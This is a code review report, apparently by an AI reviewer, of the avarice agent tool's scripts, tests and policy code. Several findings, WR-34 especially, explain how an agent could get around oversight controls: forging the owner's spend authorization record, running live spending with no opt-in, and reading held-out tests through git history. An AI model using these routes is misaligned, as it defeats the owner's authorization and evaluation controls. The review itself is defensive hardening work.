**Issue:** The header says plan 04-36 runs `--live` "after the owner authorizes the spend", but nothing in the script checks an authorization. `--live --out f` with a plan that fits the 40 USD ceiling starts spending immediately. The task-list approval (`approvedBy`) approves the tasks, not the spend. The sibling `exit-run-phase4-tools.ts run-one` refuses without a recorded authorization, and the other live suites require `AVARICE_LIVE=1`. Any agent that can run `node scripts/eval-retrieval.ts --live ...` can spend up to the whole remaining ceiling.
**Fix:** Require an explicit opt-in before the first model step, for example an authorization record shaped like the AC-14 one (list digest, cap, `ownerConfirmedAt`) read from an evidence file, or at minimum `AVARICE_LIVE=1`. Refuse `--live` otherwise, with exit 3.

### WR-34: The AC-14 spend authorization is a plain JSON field the agent can write, so the TTY check in `authorize` is not a guard (part G)

**File:** `scripts/exit-run-phase4-tools.ts:601-613`, `:692-707`, `:823-826`
**Issue:** `authorize` refuses without a terminal, but `run-one` trusts the recorded `authorization` object in `04-35-evidence-ac14.json` (`terminal: true`, `ownerConfirmedAt`, caps, `listSha256`). That file lives in the repository and is writable by the same agent that invokes the tools. Hand-writing the record (the list digest is printable from the tools) passes `authorizationProblems` completely. `terminal` is a literal boolean, not verifiable. The comment "never through an agent" is not enforced anywhere.
**Fix:** Bind the record to something the agent cannot produce. Options are an HMAC over the record with a key kept outside the repository and the agent's reach (owner-only file or keychain), or having `authorize` write to an owner-only location that `run-one` reads (as Phase 2 did with an owner authorization file). Failing that, document in the tool header that the guard is procedural only.

### WR-35: `exit-run-phase4.sh --run --only <unknown id>` exits 0 having run nothing; `--ruling-ref` without `--only` applies to every repository (part G)

**File:** `scripts/exit-run-phase4.sh:60-72`
**Issue:** The loop `continue`s for every id that is not `$only`. If `$only` matches none (a typo), nothing runs and the script falls to `exit 0` (the `verify` is skipped when `only` is set), so a retry that did nothing reports success. Separately, a `--ruling-ref` passed without `--only` is forwarded to every `run-one`, which is the signal `run-one` accepts to retry any stopped repository (`exit-run-phase4-tools.ts:844`), so one ruling reference unlocks retries of all repositories rather than the one the owner ruled on.
**Fix:**

```bash
if [ -n "$only" ] && ! printf '%s\n' $ids | grep -qx -- "$only"; then echo "exit-run-phase4: $only is not on the approved list" >&2; exit 2; fi
if [ -n "$ruling" ] && [ -z "$only" ]; then echo "exit-run-phase4: --ruling-ref needs --only" >&2; usage; fi
```

### WR-36: The arm repository still contains the denied files in git history, contradicting the stated guarantee, and `assertNoLeak` does not check it (part G)

**File:** `scripts/eval-retrieval.ts:428` (comment `:11`), `:441-445`, `:451-460`
**Issue:** The header says a changed test file is removed "so its old version is not readable either". `git rm` plus a setup commit only removes the file from the new commit's tree. The parent commit, and therefore the old held-out test and every other denied path, stays reachable through `git show HEAD~1:<path>` and `git log -p`. `reflog expire` and `gc --prune=now` remove only unreachable objects, and these are reachable. `assertNoLeak` checks the working tree, the target commit, remotes and refs, but not history, so the guard reports clean. Many tasks share one held-out file (T02/T03/T05, T08/T10, T11/T12/T14), so the file at the parent already contains the earlier tasks' tests. This is the pre-change version, not the target-commit answer, so the damage is bounded. The recorded isolation statement ("held-out test files are never placed where an arm can read them", `eval-tasks.json`) is still false for the old version.
**Fix:** Either make the claim true by replacing history with a single parentless commit of the post-removal tree before the setup commit (`git commit-tree <tree> -m ...`, then `update-ref refs/heads/eval`, then `gc`), or narrow the documented guarantee, and add to `assertNoLeak`:

```ts
for (const d of task.deniedReads) if (git(repo, ['log', '--all', '--format=%H', '-1', '--', `:(literal)${d}`]).trim() !== '') throw new EvalRefusal(`${task.id}: ${d} is still in history`);
```

(If history is kept deliberately, drop the check but fix the comment and the manifest text.)

### WR-37: The fake-remote "duplicate" fault changes nothing, so the tests that claim duplicate tolerance pass vacuously (part G)

**File:** `test/helpers/fake-remote-executor.ts:77-80`, `test/helpers/fake-remote-artifact-store.ts:75`, `test/contract/fake-remote.test.ts:93-106`, `:160-168`
**Issue:** The 2% duplicate fault only appends a `duplicate` event to the log. Nothing is delivered a second time, the client has no second-delivery path, and the request is never duplicated, which is the case that could cause a second command run. `a duplicated response is discarded: one answer, one run` therefore passes whether or not duplicates are handled correctly (it would pass if the duplicate branch were deleted, apart from the count assertion). The README and the AC-7 portability proof present "delivers 2% twice" as exercised. Only drops are actually tested.
**Fix:** Make the fault real. For the executor, deliver a second copy of the response to a handler keyed by the already-settled key and assert it is ignored, and optionally duplicate the request to the server (`serve` twice) to prove the server-side dedupe. For the store, issue the request twice. Then assert that the observable state (inner call count, blob count, returned value) is unchanged, and mutation-check the test by removing the dedupe.

### WR-38: doctor and doctor-versions tests flake under load because the doctor probe timeout is a fixed 1 s and the fake `claude` is a Node process (part H)

**File:** `test/integration/doctor-versions.test.ts:79` (also :55-:64, :98-:117 and the `rep.gsd.state` check at :41), `test/integration/doctor.test.ts:110-118`; root cause at `src/adapters/diagnostics/probes.ts:19` and `test/helpers/fake-claude.ts:84`
**Issue:** `PROBE_TIMEOUT_MS = 1_000` bounds each `spawnSync` that `avarice doctor` makes (`claude --version`, `claude --help`, the sandbox probe, the gsd identity probe, graphify). `makeFakeClaude` builds a `#!/bin/sh` wrapper that `exec`s `node claude-replay.mjs`, so every probe pays a full Node start-up. When the machine is loaded the probe exceeds 1 s, `claude()` returns `{ state: 'failed', cause: 'timed out' }` and doctor reports `refusal: 'host-unavailable'` (src/app/doctor.ts:342) instead of the version-derived refusal. I reproduced it: with 24 busy-loop processes running, `node --test --test-name-pattern="the host: admission" test/integration/doctor-versions.test.ts` failed two cases. The `2.2.0` case failed with `actual: 'host-unavailable', expected: 'host-minor-unverified'` (the line 79 failure), and the `2.1.330` case with `claudeVersion actual: null, expected: '2.1.330'`. On an idle machine each case takes about 0.8 s end to end, so the margin is only about 5x. The same 1 s bound sits under the `elapsed < 2000` wall-clock assertion at doctor.test.ts:118 and under the `rep.gsd.state === 'ok'` assertion.
**Fix:** Remove the dependence on Node start-up inside the probe window. Either make the fake's `--version` and `--help` answers pure `sh` so the wrapper does not start Node for them, for example in `test/helpers/fake-claude.ts`:
```sh
#!/bin/sh
case "$1" in
  --version) printf '%s\n' '<version text from script>'; exit 0 ;;
  --help) cat '<help file>'; exit 0 ;;
esac
exec node ... "$@"
```
or let the tests widen the bound through an environment variable that the production composition reads into `new DiagnosticProbes({ timeoutMs })` (the option already exists at probes.ts:80). Also drop or loosen the `elapsed < 2000` assertion, or have it measure only the in-process doctor, because it is a wall-clock assertion on a spawned CLI.

### WR-39: the artifact-kind source scan misses call sites written with the `{ kind, runId }` shorthand, so the "a new kind cannot be added without deciding whether it is redacted" guard has a hole (part H)

**File:** `test/integration/artifact-redaction.test.ts:117` (and the weak floor at :132)
**Issue:** The scan regex is `/artifacts\.put\([\s\S]{0,400}?\{\s*kind:\s*(\w+|'[^']+')/g`. It requires the literal `kind:` immediately after the opening brace. Two production call sites use the shorthand `{ kind, runId }` or `{ kind, runId: ... }`: `src/app/manual-inputs.ts:103` and `src/app/run-stages/restricted.ts:102` (the restricted plan, patch and decisions artifacts that this phase added). I ran the same regex over `src/`: there are 10 `artifacts.put(` calls and the regex matches 8, so the kinds `manual-context`, `manual-evidence`, `restricted-plan`, `restricted-patch` and `restricted-decisions` are never put through the "is a map kind or is in REDACTED_TEXT_KINDS" check. They are in `REDACTED_TEXT_KINDS` today, so nothing leaks now, but the guard would not catch the removal of any of them from that list, and a later caller that uses the shorthand would bypass the check entirely. The floor `kinds.size >= 7` hides the miss (the scan finds 8 distinct kinds, so it passes).
**Fix:** Make the scan count calls and fail when it cannot read one:
```ts
const calls = [...text.matchAll(/artifacts\.put\(/g)].length;
const resolved = [...text.matchAll(/artifacts\.put\([\s\S]{0,400}?\{\s*kind(?::\s*(\w+|'[^']+'))?\s*[,}]/g)];
assert.equal(resolved.length, calls, `${file}: a put call whose kind the scan could not read`);
```
and for the shorthand case, where `kind` is a parameter of the enclosing helper, check the helper's callers (or assert that `storeText` in manual-inputs.ts and `storeOutput` in restricted.ts are only called with kinds in `REDACTED_TEXT_KINDS`). Raise the floor to the real count.

### WR-40: credential-ref tests `return` early on an unexpected error kind, silently skipping the remaining assertions (part H)

**File:** `test/unit/credential-ref.test.ts:29`, `:38`, `:80`, `:97`
**Issue:** Each of these cases asserts `!parsed.ok` and then runs `if (parsed.ok || parsed.error.kind !== 'invalid') return;`, with no assertion that the kind is `'invalid'`. If the parser regressed to answering `denied`, `unavailable` or any other error kind for one of these inputs, the guard returns and the test passes. At lines 29 and 97 the `return` is inside a `for` loop, so the first input that yields another kind ends the whole test and skips every later input, including the traversal and over-length names (`keychain:../x`, `keychain:` + 129 chars). These are the S-49/SEC-2 reference-grammar tests, the grammar that decides whether a credential reference is accepted. (Line 19 is fine: it asserts the kind first.)
**Fix:** Assert the kind instead of returning, so a regression fails:
```ts
assert.ok(!parsed.ok, JSON.stringify(text));
assert.equal(parsed.error.kind, 'invalid', JSON.stringify(text));
if (parsed.error.kind !== 'invalid') return; // only narrows the type; the line above already failed the test
assert.ok(parsed.error.reason.includes('credential reference'), parsed.error.reason);
```

### WR-41: the moved-roots sandbox denial is judged only by `exitCode !== 0`, which a timeout, a cancellation or a broken `ls`/`cat` also satisfies (part H)

**File:** `test/integration/run-sandbox-other-profiles.test.ts:288-294` (also :281, :300)
**Issue:** The cases that prove the sandbox denies listing the other profile's data root, work root and config home (`/bin/ls <dir>`, `/bin/cat <config.json>`) assert only `assert.notEqual(exit.exitCode, 0)`. The executor returns `exitCode: null` for `timed_out` and `cancelled` results (src/adapters/exec/sandboxed-executor.ts:163, :213-221), and `null !== 0`, so a command that timed out (the 20 s `timeoutMs` under load) or never ran counts as "denied". There is also no positive control that `/bin/ls` and `/bin/cat` work under the same sandbox on an allowed path (the control at :301 uses `node`), so a sandbox profile that fails to exec `/bin/ls` at all would make all five assertions pass. This is the AC-6 / SEC-1 / T-04-30 denial for the listing and config-read paths, and the canary-content check that protects the `node` cases does not apply to them.
**Fix:** Require the specific permission failure and add a control, for example:
```ts
const denied = async (argv: readonly string[]): Promise<void> => {
  const r = await check(argv);
  assert.equal(r.status, 'failed'); // not timed_out / cancelled
  assert.match(r.stderr, /Operation not permitted|Permission denied/i, argv.join(' '));
};
// control: the same binary on an allowed path succeeds
assert.equal((await check(['/bin/ls', clone])).exitCode, 0);
```

### WR-42: the two process-race tests pass when the processes run one after the other, so they cannot show the race they claim (part H)

**File:** `test/fault/retrieval-race.test.ts:52,62` and `test/fault/approval-consume.test.ts:62,69,74-76`
**Issue:** Both tests release their child processes at a wall-clock barrier set 1.5 s ahead (`Date.now() + 1500`). A child that starts after the barrier simply runs immediately, so under load the "simultaneous" start degrades to a sequential one and the tests still pass. In retrieval-race.test.ts the only evidence that the race happened is `new Set(granted.map(l => l.label)).size > 1`: with `LIMIT = 10` and 5 attempts per process, a fully sequential run (p0 takes 5, p1 takes 5, the rest are refused) also has two distinct labels, so the assertion does not distinguish a race from a queue. In approval-consume.test.ts each round is separated by 40 ms and nothing checks that the two processes actually contended (for example that some round had both calls overlapping, or that either process saw a busy retry). Because these tests exist to prove T-04-42 and CS-16 (exactly-once consumption and an exact shared counter), a pass is weaker evidence than the file headers claim.
**Fix:** Have each child print the time it left the barrier and the time its call returned (it already prints one JSON line per call), and assert overlap, for example that for at least one round the two `[calledAt, returnedAt]` intervals intersect, or that the grants interleave between labels when ordered by completion time (not `p0 p0 p0 p0 p0 p1 ...`). A run in which no calls overlapped should fail with a message saying the race was not exercised.

## Info

### IN-01: `evaluatePolicy` treats an omitted `organization` as "no organization policy" even for an enterprise profile (part A)

**File:** `src/domain/policy.ts:186-191,239-254`
**Issue:** `organizationBroken` returns false when `sources.organization === undefined`, and `policySources` accepts a missing `organization` with `profileClass: 'enterprise'`. `composition.ts` always passes it today, so nothing is broken now. A future caller that forgets the field silently skips the D-17 deny-all-privileged rule.
**Fix:** In `policySources`, set `sources.organization = 'absent'` when `profileClass === 'enterprise'` and the input has none, so the evaluator's fail-closed branch applies.

### IN-02: `normalizeRemote` mis-parses a URL with a raw `@` in the password, so the remote can miss an enterprise pattern (part A)

**File:** `src/domain/profile.ts:62-64`
**Issue:** `rest.replace(/^[^/@]*@/, '')` strips up to the first `@`. For `https://user:p@ss@github.com/org/repo.git`, the result is `ss@github.com/org/repo`, and `matchesRemotePattern(..., 'github.com/org/*')` is `false` (checked). Git itself treats the last `@` before the first `/` as the userinfo end. A repository whose remote carries such a credential would not be recognized as an enterprise repository. The fault is rare because such URLs should percent-encode the `@`.
**Fix:** Strip up to the last `@` in the authority: take `rest.slice(0, rest.indexOf('/') === -1 ? rest.length : rest.indexOf('/'))`, find its `lastIndexOf('@')`, and cut there.

### IN-03: Policy action table has actions that no shell form can reach (part A)

**File:** `src/domain/action-class.ts:23-24` and `src/domain/privileged-commands.ts:28-36`
**Issue:** `scm.comment.create` and `tracker.write` are privileged actions, but `PRIVILEGED_COMMAND_FORMS` maps no shell command to them. `gh pr comment`, `gh pr review`, `gh pr close`, `gh issue create` and `gh release delete` all go through attended mode with no approval. This looks like a deliberate scope choice from plan 04-19, but the enforcement-map row (`bypassLimitation`: "obfuscated shell") does not say that the form list is a closed allow-list of a few commands.
**Fix:** Either add the forms or add a sentence to the `privileged-approval` row of `enforcement-map.ts` saying which `gh` and `git` forms are covered.

---

_Reviewed: 2026-11-22_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_

### IN-04: Run start records the brief reference after the run is created, and the active-run limit check is not atomic (part B)

**File:** `src/app/run-start.ts:289-337`
**Issue:** (a) The brief `task_refs` row is written by a separate call after `createRun` commits. If that call fails, `startRun` reports an internal error but the run already exists in `contract_ready`; a later `resume` or supervisor then runs it with no brief reference, so S-5 (refresh the brief against its digest) is silently skipped for that run, which contradicts the comment "a run whose reference cannot be recorded would resume on text nobody compared". (b) `listRuns` and `createRun` are separate transactions, so two concurrent `start` commands can both pass `limits.maxActiveRuns` and exceed it.
**Fix:** Write the brief reference inside the same `createRun` transaction (pass `taskRefs` to it), or cancel the run on failure. For the limit, count inside the creating transaction.

### IN-05: `openSync(path, O_RDONLY)` on a FIFO blocks the process (part B)

**File:** `src/app/manual-inputs.ts:58` (same pattern at `src/app/run-start.ts:115`)
**Issue:** The `fstat` regular-file check runs after `open`. Opening a named pipe with `O_RDONLY` blocks until a writer appears, so `context add --file <fifo>` and a resume that refreshes a brief path replaced by a FIFO hang forever instead of reporting `NOT_FILE`.
**Fix:** `openSync(path, constants.O_RDONLY | constants.O_NONBLOCK)` (and then `fstat`), or `lstat`/`stat` the path first and refuse non-regular files before opening.

### IN-06: A run's cumulative retrieval caps use the contract rows, not the profile caps in force now (part B)

**File:** `src/app/retrieval-guard.ts:66-71`, `104-115`
**Issue:** For a run with budget rows, `#spend` counts against the rows' limits (set when the contract was compiled), while `this.caps` (profile-narrowed) is used only for the single-read pre-check in `beginRead` and for the in-memory path. If the owner lowers `retrieval.*` in the profile config after `start`, an in-flight run keeps spending to the old contract limit. The header says caps are "the profile's caps, narrowed by the run's contract". Low impact (the contract is the owner's own earlier statement), but the two sources can disagree silently.
**Fix:** Either document that a started run is bound by its contract rows, or `Math.min` the row limit with the profile cap at spend time.

---

_Reviewed: 2026-11-22_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_

### IN-07: A redacted restricted patch can stop applying, and the block text does not say so (part C)

**File:** `src/app/run-stages/restricted.ts:287-291`; `src/adapters/fs/redacting-artifact-store.ts:25-27`
**Issue:** `restricted-patch` is in `REDACTED_TEXT_KINDS`, so a hunk containing a secret-looking string is rewritten before it is stored and the digest recorded is that of the redacted bytes. That is the right default for secrets. But the patch is a binary-form `git diff` (`--binary`), and a redacted line makes the hunk fail to apply (and the base85 payload of a binary change can match a pattern by chance). The block text promises "Apply the patch ... (git apply)" and never says the stored patch may differ from the working copy.
**Fix:** When `redacted` bytes differ from the input (compare `put.value.digest` with the digest of the original text, or `put.value.size` with the byte length), add "the patch was redacted and may not apply" to the issue text.

### IN-08: Whether an onboarding is restricted is read only from the mapping plan, and an absent plan selects the contained host (part C)

**File:** `src/app/stages/shared.ts:86-88`; also `src/app/stages/index-stage.ts:66` and `src/app/stages/activate.ts:147`
**Issue:** `hostOfOnboarding(deps, plan)` returns `deps.restrictedHost` only when the stored `mapping:plan` has `restricted: true`; with `plan === null` it returns `deps.host`. The docstring says nothing falls back from one host to the other. The authoritative request is `restrictedOfPreflight(row.preflight)`, set at registration. Today `mapping:plan` is always recorded before the `mapping` state, so the null case does not arise, and the fallback is to the enforced host, not an unsafe one. But `index-stage` and `activate` also derive `restricted` from the same plan, so a lost or unreadable plan would silently turn a restricted onboarding into a contained one instead of stopping.
**Fix:** Derive `restricted` from `restrictedOfPreflight(row.preflight)` and treat a mismatch with the plan, or a missing plan for a restricted request, as an `internal` error.

---

_Reviewed: 2026-11-22_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_

### IN-09: `spendBudgets` turns a repeated row name into a `conflict` instead of a refusal (part D)

**File:** `src/adapters/sqlite/ledger.ts:878-887`
**Issue:** The pre-check compares each spend against the unmodified row, but the apply loop updates sequentially. If `spends` names one row twice and each amount fits alone but not together, the second `UPDATE` changes 0 rows and the method aborts with `conflict`, not `{ spent: false }`. `retrieval-guard.ts` currently maps distinct counters to distinct rows, so this does not occur today, but the contract ("when any one does not fit nothing is spent and the row that stopped it is named") is not met for duplicates.
**Fix:** Sum amounts per name before the check (`const need = new Map<string, number>()`), or reject duplicate names as `invalid`.

### IN-10: `readEnterprisePatterns` follows a symbolic-link profile directory that `knownProfileRoots` refuses (part D)

**File:** `src/adapters/fs/profile-bindings.ts:191-196`
**Issue:** `profile-registry.ts` skips a profile directory that is a link (`lstatSync(...).isDirectory()`). `readEnterprisePatterns` lists names and opens `profiles/<name>/config.json` with `O_NOFOLLOW` on the last component only, so an `enterprise-*` entry that is a link to another directory is read and its `remotePatterns` are used to route repositories to that profile. The two readers should apply the same rule about what counts as a profile directory.
**Fix:** Before `readSmallJson`, `lstatSync(join(configHome, 'profiles', name)).isDirectory()` and skip otherwise.

### IN-11: Attended hook spends the approval before the host decides whether the command runs (part D)

**File:** `src/hook/pre-tool-use.ts:559-570`
**Issue:** The approval is consumed and `action.started` is recorded in PreToolUse, and the hook then prints nothing so the host's own permission rules apply. If the host's prompt is declined (or the call fails before it starts), the owner's approval is gone and `action.started` is a false record. This follows from the design (approval never widens what the host asks), so it is not a defect to fix in this hook, but `docs/system/` should state that an approval is spent when the hook passes the call, not when the command succeeds.
**Fix:** Document it; optionally record a matching `action.interrupted`/`action.finished` from a PostToolUse attended entry.

---

_Reviewed: 2026-11-22_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_

### IN-12: Circular imports between `staging-base.ts` and `promotion.ts` / `staged-specs.ts` (part E)

**File:** `src/adapters/git/staging-base.ts:27-28` (imports) and `src/adapters/git/promotion.ts:19`, `src/adapters/git/staged-specs.ts:14`
**Issue:** `staging-base.ts` imports `commitPromotion`, `copyIntoCheckout`, `stageGsdSpecs` and `unstageGsdSpecs`, while those modules import `COMMIT_SHA`, `ONBOARDING_ID`, `checkRelative`, `ensureConfinedDir`, `readConfinedFile` and others back from `staging-base.ts`. It works today only because no module-level statement in either direction uses an imported binding at evaluation time (the `const` exports would be in the temporal dead zone). Adding a top-level use, for example building a regex from `COMMIT_SHA` in `promotion.ts`, would fail at load depending on which module is imported first.
**Fix:** Move the shared helpers (`COMMIT_SHA`, `ONBOARDING_ID`, `checkRelative`, `readConfinedFile`, `ensureConfinedDir`, `inside`, `invalid`, `denied`, `failure`, `sortedUnique`) into a leaf module such as `staging-paths.ts`, and import that from all three.

### IN-13: `commitPromotion` does not guard NUL in the message; `copyIntoCheckout` loses its progress on a late error (part E)

**File:** `src/adapters/git/promotion.ts:171` and `:121-123`
**Issue:** `commitPromotion` only checks `input.message.trim() === ''`. A message containing a NUL byte reaches `spawnSync`, which throws synchronously (`ERR_INVALID_ARG_VALUE`) instead of returning a `Result`, because `runGit` has no try/catch around the spawn. `run-workspace.ts` `commit` already rejects a NUL in the message. Separately, in `copyIntoCheckout` a later file that fails with an `internal` error returns the bare error, so the caller (`src/app/stages/promote.ts:113`) cannot tell which files were already created in the owner's checkout (they are never removed).
**Fix:** Add `|| input.message.includes('\0')` to the message check. For the second point, return the partial outcome in the error cause (for example list `written` in `cause`), or continue past the failing file and report it under a `failed` list.

---

_Reviewed: 2026-11-22_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_

### IN-14: `approve` shows the full request and asks before checking whether it was already granted (part F)

**File:** `src/cli/commands/approve.ts:93-117`
**Issue:** `findApprovalRequest` does not report whether an approval already answered the request, so the owner reads the summary and answers `y`, and only then does `grantApproval` return `conflict` ("request ... was already approved", exit 3). The ledger enforces the single grant correctly; the cost is a wasted prompt and a late, confusing refusal.
**Fix:** Let `findApprovalRequest` (or a sibling) return an `answered` flag, and exit 3 with the same message before prompting.

### IN-15: The host configuration directory and hook entry are resolved by four slightly different copies (part F)

**File:** `src/cli/composition.ts:236-242, 273-278`; `src/cli/doctor-deps.ts:41-44`; `src/cli/commands/install-host.ts:38-49`; `src/cli/host-config-dir.ts:25-33`
**Issue:** The comment at composition.ts:241 says the composition rule "must agree" with `effectiveHostConfigDir`, but composition passes the raw `CLAUDE_CONFIG_DIR` (not made absolute or resolved to a real path), `install-host` reads `process.env` instead of the `env` main() was given, and `productionHost` and `productionRestrictedHost` repeat about fifteen identical lines. A relative `CLAUDE_CONFIG_DIR` yields a relative `skillsRoot`/`configDir` for the host adapter while `start` records and `doctor` reports the absolute one.
**Fix:** Use `effectiveHostConfigDir(env, home)` in both host builders and in `install-host`, and extract one `resolveClaudeInputs(env, home)` helper for `claudeBin`, `hookEntry` and `configDir`.

### IN-16: `readInputFile` can block forever on a FIFO path given to `evidence add --file` or `context add --file` (part F)

**File:** `src/app/manual-inputs.ts:58` (reached from `src/cli/commands/evidence.ts:53` and `src/cli/commands/context.ts:76`)
**Issue:** The file is opened with `O_RDONLY` before `fstat` rejects non-regular files. Opening a named pipe for reading blocks until a writer appears, so the "is not a regular file" check is never reached and the command hangs. The input is owner-supplied, so this is robustness, not an attack.
**Fix:** Open with `constants.O_RDONLY | constants.O_NONBLOCK` (and `O_NOFOLLOW` if links are unwanted), then `fstat`.

---

_Reviewed: 2026-11-22_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_

### IN-17: Importing `test/helpers/live-harness.ts` mutates `process.env` for every importer, which makes `eval-retrieval.ts`'s own conditional dead (part G)

**File:** `test/helpers/live-harness.ts:371`, `scripts/eval-retrieval.ts:785`
**Issue:** `process.env.AVARICE_DEBUG_TRANSCRIPTS = '1'` runs at module load. `eval-retrieval.ts` and `exit-run-phase4-tools.ts` import the module, and `runCli` spreads `process.env`, so the opt-in is always on. The `ctx.evidenceRoot !== undefined ? { AVARICE_DEBUG_TRANSCRIPTS: '1' } : {}` condition in `cli()` therefore has no effect, and `--evidence-dir` is not what controls whole-transcript storage as the comment claims. For `run-one` the AC-14 onboardings of the owner's real profiles also keep full redacted transcripts. The comment says this is intended for the exit tools, but a side effect at import is surprising for the evaluation harness.
**Fix:** Make the opt-in explicit where needed (export a function or pass the variable in the spawned env), and delete the conditional, or the import-time assignment, so only one of them exists.

### IN-18: `status-bench.ts` derives its path from `URL.pathname` (part G)

**File:** `scripts/status-bench.ts:21`
**Issue:** `new URL(import.meta.url).pathname` is percent-encoded, so a checkout path with a space or non-ASCII character becomes a wrong `entry`, and `status` then fails with a confusing module-not-found.
**Fix:** `import { fileURLToPath } from 'node:url'; const entry = resolve(dirname(fileURLToPath(import.meta.url)), '..', 'bin', 'avarice.ts');`

### IN-19: The executor contract case "denies the network" has no positive control (part G)

**File:** `test/contract/command-executor.cases.ts:118-137`
**Issue:** It asserts only `status === 'failed'`, `exitCode !== 0` and `hits === 0`. A missing `curl` (exit 127, or a sandbox that blocks exec of it) satisfies all three without proving the network is denied. Its siblings (write, read) do include an allowed counterpart; this one does not.
**Fix:** Run the same curl once through a control path that is allowed to reach loopback (or assert on the exit code, `7`/`28`, or on stderr text), so the case fails if curl never ran.

### IN-20: Task `id` is used unvalidated as a path component (part G)

**File:** `scripts/eval-retrieval.ts:132-133`, `:830`, `:724`
**Issue:** Only `id !== ''` and uniqueness are checked, but `id` names the scratch directory (`mkdtempSync(join(ctx.scratch, \`${id}-...\`))`) and the evidence directory (`freshEvidenceDir(root, \`${task}-${arm}\`)`). An id such as `../x` writes outside the scratch or evidence root. The list is owner-approved, so this is hardening only. `repositories` ids in the AC-14 tool already use `SAFE_ID`.
**Fix:** Validate task ids with the same pattern: `/^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/`.

### IN-21: `briefFor` does not neutralize fence lines or enforce brief limits (part G)

**File:** `scripts/eval-retrieval.ts:482-505`
**Issue:** `parseBrief` treats a line starting with three backticks as toggling a code fence and only starts a section outside a fence (`src/domain/brief.ts:363-366`). A commit message with an odd number of fence lines leaves the fence open at the harness's own `## Acceptance criteria`, so the acceptance section is never parsed. The harness also does not check `BRIEF_LIMITS.lineChars` (4096) or `bytes` (65536) for the message plus scope line, so an over-long line makes `start` refuse after the onboarding was paid for. None of the 20 approved tasks triggers either today (checked: no fence lines, longest line 376), so this is latent.
**Fix:** After building the brief, run `parseBrief` (or an equivalent check) over it in the dry run, and escape lines matching `/^\s*```/` in the message.

### IN-22: Robustness gaps in the live driver's setup and evidence copy (part G)

**File:** `scripts/eval-retrieval.ts:843-846`, `:656-658`
**Issue:** `git for-each-ref ... refs/heads/avarice/onboard-*` returns one line per branch; if the map onboarding left more than one, `branch` contains a newline and `checkout -B eval <branch>` throws after the map step was paid for, halting the whole evaluation. In `captureEvidence`, the per-table `catch {}` labels any failure (a locked database, a value `JSON.stringify` cannot serialize) as `(no such table)`, so evidence can be silently dropped with a misleading manifest.
**Fix:** Take the first/most recent branch (`--sort=-creatordate --count=1`) and refuse explicitly on more than one. Distinguish the `no such table` error message from other errors and record the real message in `manifest.absent`.

---

_Reviewed: 2026-11-22_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_

### IN-23: `git push` no longer exercises the denied-prefix path in the "deny beats allow" mutation test (part H)

**File:** `test/mutation/fail-closed.test.ts:181-188`
**Issue:** Plan 04-19 changed the case so `git push origin main` is expected to be refused as `privileged:git.push`, because the privileged rule now answers before the prefix rules. The test still reads "refuses a denied prefix even when a broad read-only entry would otherwise admit the command", but only `git config core.pager x` still reaches `shell-denied-prefix`. A mutation that stops `'git push'` in `deniedPrefixes` from being honoured is no longer caught here for the push entry. This is acceptable because the privileged rule is the stronger control, but the case now documents less than its title says.
**Fix:** Rename the case to cover both the denied prefix (git config) and the privileged form (git push), or add a denied prefix that is not privileged (for example `git remote add`) to the loop so the prefix rule keeps a second witness.

### IN-24: approval-guard trigger assertions match only the table name (part H)

**File:** `test/fault/migrations.test.ts:414-424` and the following guard assertions in the same case
**Issue:** `assert.throws(() => db.exec("DELETE FROM approvals ..."), /approvals/)` accepts any SQLite error that mentions the table, such as a foreign-key or NOT NULL failure, not specifically the 0004 guard. approval-consume.test.ts:116-118 already uses the precise messages (`/change only by setting consumed_at or revoked_at once/`, `/never deleted/`).
**Fix:** Reuse those two messages as the regexes here so a different failure cannot satisfy the guard check.

### IN-25: the live attended case records `ghStubRan` after the second session but never asserts it (part H)

**File:** `test/containment/live-run-phase4.test.ts:658` (recorded at :667)
**Issue:** The "allowed once" half of `p4-attended-approve` is judged by an `action.started` event with source `approval`, one consumed approval and a result text that no longer carries the denial. The stub `gh` marker, which is the direct evidence that the command was allowed to run, is only written into the JSONL record. Live-only (skipped without `AVARICE_LIVE=1`), so informational.
**Fix:** `assert.equal(ghStubRan, true, 'the stub gh did not run after the approval')`.

### IN-26: fixtures are built in `describe` bodies, so they run at file load and a failure there is a suite-load failure (part H)

**File:** `test/fault/privileged-no-replay.test.ts:105-106, 119-120, 170-171, 196-197`; `test/integration/portability-proof.test.ts:146-149, 313-318`; `test/integration/profile-propagation.test.ts:53-55`; `test/integration/credential-broker.test.ts:467-470`
**Issue:** `fixture()`, `killedRun()` (which kills a supervisor and then `sleepSync(1500)`), `onboardOutcome()` and `startWithFakeRunHost()` run while the file is being collected, before any `it`. They run even when `--test-name-pattern` selects other tests, a failure inside them is reported against the describe rather than a test, and in privileged-no-replay the four 1.5 s sleeps are serial at load. Cleanup still happens because `after` is registered, so this is not a leak.
**Fix:** Move the setup into `before(() => { ... })` hooks of the describe (as profile-isolation.test.ts and redaction-suite.test.ts already do).

### IN-27: `setup` and `teardown` of the assembler-caps describe are ordinary tests (part H)

**File:** `test/integration/retrieval-caps.test.ts:246-248, 316-318`
**Issue:** `o` is assigned in an `it('setup: ...')` and closed in an `it('teardown')`. If the setup case fails, the five following cases throw a `TypeError` on `o.deps` and the teardown throws on `o.close()`, hiding the real failure; if a middle case is cancelled the store may stay open.
**Fix:** Use `before`/`after` for these two steps.

### IN-28: the seeded credential value is excluded from the hook-target input of the AC-5 corpus (part H)

**File:** `test/integration/redaction-suite.test.ts:99-103, 355-357`
**Issue:** The suite header says the corpus is injected "through every input", but the hook-target input (names of files the unit writes) carries only the pattern kinds, not the seeded literal, because the hook is a separate process that never resolves a credential. The comment records this as an owner decision. A seeded value that appears in a written file name is therefore stored unredacted in `events`/`hook_reads`, and the 0-hits count does not cover it. Not a test defect; recorded so the owner sees that AC-5 is "0 for every input except a seeded value in a hook target".
**Fix:** Keep the recorded decision, and add a line to `docs/system/findings.md` (per CLAUDE.md) naming this gap, or seed the hook process from the ledger's credential events.

---

_Reviewed: 2026-11-22T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
